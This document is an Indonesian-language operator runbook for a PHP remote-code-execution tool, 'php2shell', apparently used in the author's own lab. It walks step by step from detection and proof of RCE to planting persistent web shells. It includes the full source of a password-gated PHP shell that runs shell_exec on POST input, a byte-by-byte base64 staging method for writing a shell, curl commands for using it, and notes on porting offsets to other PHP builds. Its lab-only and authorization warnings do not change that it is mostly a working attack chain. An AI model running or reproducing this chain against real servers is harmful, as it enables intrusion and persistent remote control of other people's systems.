# RUNBOOK — dari RCE php2shell sampai up-shell (lab sendiri)

Terbukti live 26 Okt 2026 di lab ini. Untuk PRACTICE di target milikmu.
Untuk bug bounty: kebanyakan RoE melarang shell tertinggal — cukup
`--proof-file` (uid=), JANGAN tanam shell.

---

## 0. Jawaban jujur: sudah dicoba di semua versi rentan?

TIDAK SEMUA — data `builds` (5 RCE / 3 LEAK / 5 NO):

| PHP | arch | dukungan | catatan |
|---|---|---|---|
| 8.4.26 | amd64 | RCE | build referensi lab — profil `bookworm` |
| 8.5.11 | amd64/aarch64 | RCE | offset terpisah |
| 8.5.10 | aarch64 | RCE | |
| 8.4.25 | aarch64 | RCE | stage3 probabilistik, perlu retry |
| 8.5.0 | any | LEAK | layout stage3 tak ditemukan |
| 8.3.35 | aarch64 | LEAK | stage3 tak jalan |
| 8.3.33 | amd64 | LEAK | wordpress:7.1.1-apache |
| 8.3.0 / 8.2.34 / 8.1.34 / 8.0.30 / 7.4.33 | aarch64 | NO | UAF ada, bentuk leak beda |

Rantai RCE = tebak-offset per build. Hanya profil `bookworm` terkalibrasi
penuh di tool ini (php:8.4.26-apache amd64, Apache 2.4.69, mod_php,
single-worker prefork, KeepAlive Off, upload_progress On, memory_limit 8M).
Versi lain butuh offset baru (lihat §6).

---

## 1. Prasyarat lab (sekali)

```bash
cd /home/lota1337/python/php2shell
source /home/lota1337/myenv/bin/activate
docker start p2s-rce3 && sleep 2
curl -s http://127.0.0.1:8093/            # harus: OK2
docker exec p2s-rce3 php -i | grep -E "upload_progress.enabled|memory_limit"
#   upload_progress.enabled => On         <- syarat rantai
#   memory_limit => 8M                    <- syarat field 'big'
```

## 2. Deteksi

```bash
python php2shell.py detect -u http://127.0.0.1:8093/
# verdict: vulnerable — PHP 8.4.26 < fix-floor 8.4.27
```

## 3. Bukti RCE — SELALU langkah pertama

```bash
python php2shell.py exploit -u http://127.0.0.1:8093/ --yes --proof-file p1
# sukses: PROOF (...): uid=33(www-data)   (~10 dtk)
# BLIND  : perintah terkirim, kanal bukti tak ada (wajar di target tanpa
#          mount /out) — lanjut tahap 4-5.
```

## 4. Up-shell A — cara cepat (hanya lab ber-mount /out)

```bash
# file corong di HOST (ter-mount sebagai /out di target):
cat > /home/lota1337/python/php2shell/out/u <<'EOF'
#!/bin/sh
cp /out/w9.php /var/www/html/w9.php
EOF
cat > /home/lota1337/python/php2shell/out/w9.php <<'EOF'
<?php
if (isset($_POST['k']) && $_POST['k']==='up9' && isset($_POST['c'])) {
  $c = $_POST['c'];
  echo ($c === '__free__') ? shell_exec($_POST['cmd']) : shell_exec($c);
}
EOF

# 1 perintah RCE:
python shell/upshell_lab.py -u http://127.0.0.1:8095/ --password up9
# pakai:
curl -s -X POST -d 'k=up9' -d 'c=id' http://127.0.0.1:8095/w9.php
```

## 5. Up-shell B — live-style TANPA mount (metode universal di lab)

```bash
python shell/upshell_live.py -u http://127.0.0.1:8093/ --name s3.php
```
Yang dilakukan tool (semua otomatis):
1. leak chunk+libphp per perintah (full-chain, pola run_exploit);
2. stage b64: `printf 'C' >v` / `>>v` 1 char/request (14 byte), cek GET /v
   per char → retry bila stage3 ngambek;
3. `base64 -d<v>g` → `mv g s3.php` → bersih-bersih;
4. verifikasi: POST c=id → uid=.

Hasil di lab: s3.php aktif, `c=id` → uid=33(www-data).
Tiga fix penting yang sudah tertanam di tool:
- dash menelan digit sebelum `>>` (fd-redirect) → `printf '9' >>v`;
- stage3 probabilistik → verifikasi per-char;
- PHP 8 strict bareword → shell memakai `$_REQUEST['c']`.

Pakai shell-nya:
```bash
curl -s -X POST -d 'c=id' http://127.0.0.1:8093/s3.php
curl -s -X POST --data-urlencode 'c=ls -la /var/www/html' http://127.0.0.1:8093/s3.php
```

## 6. Versi PHP lain (8.5.11, 8.4.25 aarch64, dsb.)

1. Cek dukungan: `python php2shell.py builds`.
2. RCE sudah terbukti di 5 build — tapi offset per-build: profil aktif di
   `lib/chain.py` (PROFILES). Untuk build baru: ekstrak offset dari binary
   (zif_system, dtor, htdata) dengan teknik devploit/php2shell atau
   9bie/php2shell-bypass-aslr-exp; tambah entri profil; uji:
   `exploit --proof-file` dulu, lalu upshell_live `--profile <nama>`.
3. 8.1.x/8.2.x/8.0/7.4 = LEAK/NO: rantai ini belum jalan — jangan paksakan.

## 7. Bersih-bersih

```bash
python - <<'PY'
import sys; sys.path.insert(0,'.')
from shell.upshell_live import full_chain_cmd
for cmd in ("rm s3.php", "rm v", "rm g"):
    full_chain_cmd("http://127.0.0.1:8093/", cmd)
PY
# atau dari dalam: curl POST c='rm /var/www/html/s3.php'
```

---

Larangan tetap: JANGAN pakai di target yang bukan milikmu/berotorisasi.
Kegagalan jujur (BLIND/HEAP_LEAK_FAILED) = perilaku aman tool, bukan bug.
